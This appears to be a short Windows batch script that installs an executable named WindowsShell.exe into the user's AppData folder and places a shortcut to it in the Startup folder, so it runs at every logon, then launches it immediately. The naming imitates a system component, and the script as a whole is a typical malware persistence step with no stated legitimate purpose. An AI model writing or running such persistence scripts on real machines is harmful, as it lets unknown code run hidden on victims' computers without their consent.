copy WindowsShell.exe "C:\Users\%USERNAME%\AppData\Roaming"
copy WindowsShell.lnk "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

start "" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsShell.lnk"
